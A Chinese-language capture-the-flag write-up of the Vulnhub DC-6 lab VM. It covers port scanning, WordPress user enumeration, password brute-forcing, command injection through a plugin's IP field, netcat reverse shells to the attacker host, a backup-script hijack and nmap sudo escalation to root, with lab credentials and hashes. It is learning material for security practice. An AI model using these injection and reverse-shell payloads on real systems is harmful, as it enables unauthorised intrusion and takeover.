---
title: Vulnhub-DC-6
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-6

> https://www.vulnhub.com/entry/dc-6,315/
> 

## 主机发现端口扫描

1. 探测存活主机，`177`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 22:39 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00021s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00019s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.177
    Host is up (0.00013s latency).
    MAC Address: 00:0C:29:C7:D5:F4 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 扫描靶机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.177
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 22:39 CST
    Nmap scan report for 192.168.75.177
    Host is up (0.0013s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:C7:D5:F4 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sV -sT -O -p80,22 192.168.75.177     
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 22:40 CST
    Nmap scan report for 192.168.75.177
    Host is up (0.00038s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    MAC Address: 00:0C:29:C7:D5:F4 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.177
    //
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 22:41 CST
    Nmap scan report for 192.168.75.177
    Host is up (0.00026s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-wordpress-users: 
    | Username found: admin
    | Username found: graham
    | Username found: mark
    | Username found: sarah
    | Username found: jens
    |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
    | http-enum: 
    |   /wp-login.php: Possible admin folder
    |   /readme.html: Wordpress version: 2 
    |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
    |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
    |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
    |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
    |   /wp-login.php: Wordpress login page.
    |   /wp-admin/upgrade.php: Wordpress login page.
    |_  /readme.html: Interesting, a readme.
    MAC Address: 00:0C:29:C7:D5:F4 (VMware)
    ```
    
    网站CMS是`wordpress` ，并且找到了几个用户名，其中包括`admin`
    

## web渗透

1. 话不多说，先用`wpscan`扫描一波
    
    ```python
    # wpscan -e u --url http://wordy         
    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
    
             WordPress Security Scanner by the WPScan Team
                             Version 3.8.27
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________
    
    [+] URL: http://wordy/ [192.168.75.177]
    [+] Started: Sat Nov  2 22:45:10 2024
    
    Interesting Finding(s):
    
    [+] Headers
     | Interesting Entry: Server: Apache/2.4.25 (Debian)
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
    
    [+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
    
    [+] WordPress readme found: http://wordy/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299
    
    [+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
     | Found By: Rss Generator (Passive Detection)
     |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
     |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
    
    [+] WordPress theme in use: twentyseventeen
     | Location: http://wordy/wp-content/themes/twentyseventeen/
     | Last Updated: 2024-07-16T00:00:00.000Z
     | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
     | [!] The version is out of date, the latest version is 3.7
     | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
     | Style Name: Twenty Seventeen
     | Style URI: https://wordpress.org/themes/twentyseventeen/
     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     |
     | Version: 2.1 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'
    
    [+] Enumerating Users (via Passive and Aggressive Methods)
     Brute Forcing Author IDs - Time: 00:00:00 <====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
    
    [i] User(s) Identified:
    
    [+] admin
     | Found By: Rss Generator (Passive Detection)
     | Confirmed By:
     |  Wp Json Api (Aggressive Detection)
     |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)
    
    [+] graham
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
    
    [+] mark
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
    
    [+] sarah
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
    
    [+] jens
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
    
    ```
    
2. 扫描目录，也没什么实质性有用的
    
    ```python
    dirsearch -u 192.168.75.177 -x 403                             
    //                                                                                                                                                                                   
    [22:52:13] 404 -   51KB - /index.php/login/                                 
    [22:52:14] 200 -   18KB - /index.php                                        
    [22:52:15] 200 -    7KB - /license.txt                                      
    [22:52:28] 200 -    3KB - /readme.html                                      
    [22:52:44] 301 -  319B  - /wp-admin  ->  http://192.168.75.177/wp-admin/    
    [22:52:44] 500 -    3KB - /wp-admin/setup-config.php                        
    [22:52:44] 400 -    1B  - /wp-admin/admin-ajax.php                          
    [22:52:44] 302 -    0B  - /wp-admin/  ->  http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.75.177%2Fwp-admin%2F&reauth=1
    [22:52:44] 200 -    0B  - /wp-config.php
    [22:52:44] 200 -  517B  - /wp-admin/install.php                             
    [22:52:44] 200 -    0B  - /wp-content/                                      
    [22:52:44] 301 -  321B  - /wp-content  ->  http://192.168.75.177/wp-content/
    [22:52:44] 500 -    0B  - /wp-content/plugins/hello.php                     
    [22:52:45] 301 -  322B  - /wp-includes  ->  http://192.168.75.177/wp-includes/
    [22:52:45] 500 -    0B  - /wp-includes/rss-functions.php                    
    [22:52:45] 200 -    0B  - /wp-cron.php                                      
    [22:52:45] 200 -    1KB - /wp-login.php
    [22:52:45] 302 -    0B  - /wp-signup.php  ->  http://wordy/wp-login.php?action=register
    [22:52:45] 200 -    4KB - /wp-includes/                                     
    [22:52:45] 405 -   42B  - /xmlrpc.php 
    ```
    
3. 尝试爆破用户但是没成功（使用`cewl`生成字典然后再通过`John`拓展字典），然后本想着用`rockyou`字典给五个用户直接爆破的，但是结果需要`71721960` 次请求，最后发现作者其实给了提示：
    
    ```python
    OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job.
    
    cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)
    ```
    
    好家伙，我们去尝试尝试
    
    ```python
    cat /usr/share/wordlists/rockyou.txt | grep k01 > passwd
    ```
    
    然后接着使用`wpscan`爆破，`wordy-uname`的内容是枚举出来的那几个用户
    
    ```python
    wpscan --url http://wordy --usernames wordy-uname --passwords passwd
    //
    [!] Valid Combinations Found:
     | Username: mark, Password: helpdesk01
    ```
    
    爆破出了用户`mark`的密码`helpdesk01`
    

## 后台利用

1. 登陆后台，无死角寻找可利用的点，在`Activity Monitor`发现个奇怪的点
    
    ![image.png](image%2034.png)
    
    网上查阅漏洞，发现只要输入 `ip | command` 即可执行命令，比如输入 `127.0.0.1 | ls` 再点击`lookup` ,就会执行`ls`命令
    
    ```python
    2024-11-02 15:53:34
    
    The IP address 127.0.0.1 | ls resolves to .
    
    Output from dig:
    
    about.php
    admin-ajax.php
    admin-footer.php
    
    .....
    
    user-edit.php
    user-new.php
    users.php
    widgets.php
    ```
    
2. 本来想着直接输入反弹`shell`命令但是发现有长度限制，我们输入`127.0.0.1 | ls` 抓包看看
    
    ```python
    -----------------------------129755843329691969431898324683
    Content-Disposition: form-data; name="ip"
    
    127.0.0.1 | ls
    -----------------------------129755843329691969431898324683
    Content-Disposition: form-data; name="lookup"
    
    Lookup
    -----------------------------129755843329691969431898324683--
    ```
    
    我们将`ls`改为别的命令测试，返回结果显示
    
    ![image.png](image%2035.png)
    
3. 我们将命令改为反弹`shell`命令，同时`kali`开启监听
    
    ```python
    -----------------------------129755843329691969431898324683
    Content-Disposition: form-data; name="ip"
    
    127.0.0.1 | nc 192.168.75.151 1234 -e /bin/bash
    -----------------------------129755843329691969431898324683
    Content-Disposition: form-data; name="lookup"
    
    Lookup
    -----------------------------129755843329691969431898324683--
    ```
    
    获得`shell`
    

## 提权

1. 查看权限
    
    ```python
    $ whoami
    www-data
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ uname -a
    Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
    ```
    
2. 寻找敏感文件
    - 在wp-admin.php下存在数据库账号密码`wpdbuser`，`meErKatZ`
        
        ```python
        define( 'DB_USER', 'wpdbuser' );
        
        /** MySQL database password */
        define( 'DB_PASSWORD', 'meErKatZ' );
        ```
        
3. 登录数据库发现是`MariaDB` ，尝试查找有用数据，查看用户表
    
    ```python
    select * from wp_users;
    +----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
    | ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name    |
    +----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
    |  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         | blah@blahblahblah1.net.au   |          | 2019-04-24 12:52:10 | 1730559782:$P$BKYxKh8422wMLCjdKGb5OIG7VWZZX3/ |           0 | admin           |
    |  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        | graham@blahblahblah1.net.au |          | 2019-04-24 12:54:57 |                                               |           0 | Graham Bond     |
    |  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          | mark@blahblahblah1.net.au   |          | 2019-04-24 12:55:39 |                                               |           0 | Mark Jones      |
    |  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         | sarah@blahblahblah1.net.au  |          | 2019-04-24 12:56:10 |                                               |           0 | Sarah Balin     |
    |  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          | jens@blahblahblah1.net.au   |          | 2019-04-24 13:04:40 | 1556111080:$P$B5/.DwEMzMFh3bvoGjPgnFO0Qtd3p./ |           0 | Jens Dagmeister |
    +----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
    ```
    
4. 使用`john`爆破，好久了都没出来，寻找别的线索
5. 发现mark用户的加目录下存在`things-to-do.txt` ，里面有`graham`用户的账号密码，尝试`ssh`登录，成功进入
    
    ```python
    $ cat things-to-do.txt
    //
    Things to do:
    
    - Restore full functionality for the hyperdrive (need to speak to Jens)
    - Buy present for Sarah's farewell party
    - Add new user: graham - GSo7isUM1D4 - done
    - Apply for the OSCP course
    - Buy new laptop for Sarah's replacement
    ```
    
6. 查看权限，可以使用`jens`用户执行`backups.sh`脚本
    
    ```python
    graham@dc-6:~$ sudo -l
    Matching Defaults entries for graham on dc-6:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User graham may run the following commands on dc-6:
        (jens) NOPASSWD: /home/jens/backups.sh
    ```
    
7. 查看脚本内容，就是备份网站内容
    
    ```python
    graham@dc-6:/home/jens$ cat backups.sh 
    //
    #!/bin/bash
    tar -czf backups.tar.gz /var/www/html
    ```
    
8. 我们将反弹`shell`语句追加到文件尾部，然后运行
    
    ```python
    echo nc 192.168.75.151 1234 -e /bin/bash >> backups.sh
    ```
    
    注意kali记得先开启监听
    
    ```python
    sudo -u jens /home/jens/backups.sh
    ```
    
    获得新的用户`shell`，用户是`jens`
    
    ```python
    whoami
    jens
    ```
    
9. 查看权限，存在`root`权限的`nmap` ，可以进行提权了
    
    ```python
    jens@dc-6:/var$ sudo -l
    sudo -l
    Matching Defaults entries for jens on dc-6:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User jens may run the following commands on dc-6:
        (root) NOPASSWD: /usr/bin/nmap
    ```
    
10. `nmap`提权
    - 编写提权脚本
        
        ```python
        $ echo "os.execute('/bin/sh')" > getshell.nse
        ```
        
    - `nmap`执行脚本，获得root权限
        
        ```python
        $ sudo nmap --script=getshell.nse
        
        #
        ```
        
11. 读取`flag`文件
    
    ```python
    # cat theflag.txt
    
    Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
     Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
      YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
       YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 
    
    Congratulations!!!
    
    Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
    who have provided feedback, and who have taken time to complete these little
    challenges.
    
    If you enjoyed this CTF, send me a tweet via @DCAU7.
    ```